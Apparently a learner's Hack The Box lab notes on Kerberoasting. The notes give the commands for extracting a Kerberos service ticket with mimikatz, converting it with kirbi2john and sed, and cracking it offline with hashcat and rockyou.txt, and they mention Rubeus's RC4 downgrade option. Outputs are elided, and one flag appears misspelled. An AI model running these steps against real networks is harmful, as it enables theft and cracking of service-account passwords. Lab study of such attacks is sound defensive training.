- Let us first explore the manual way of conducting this attack. 
...
Existing SPN found!
```
- Let us focus on the user accounts for right now. We are going to now request the TGS Ticket and load it into memory. After we are going to use mimkatz to extract the ticket. 
...
**Using mimikatz to Extract TGS Ticket**
```cmd-session
...
```shell-session
realCustampin@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
...
```shell-session
realCustampin@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

**Extracting the Kerberos Ticket using kirbi2john.py**
```shell-session
realCustampin@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

**Editing crack_file for Hashcat**
```shell-session
realCustampin@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

**Viewing the Prepared Hash**
```shell-session
realCustampin@htb[/htb]$ cat sqldev_tgs_hashcat 
...
```shell-session
realCustampin@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
**Using Rubeus to Kerberoast User testspn**
```powershell-session
...
**Cracking the Ticket with Hashcat and rockyou.txt**
```shell-session
realCustampin@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
**Checking the Supported Encryption Types**
```powershell-session
...
**Running Hashcat and Checking the Status of the Cracking Job**
```shell-session
realCustampin@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
...
- By using the /tgtdelag flag with rubeus, we can basically tell the Domain Controller to provide the ticket in an RC4 Encryption Method when requesting the new ticket. 

![[Pasted image 20251112185521.png]]
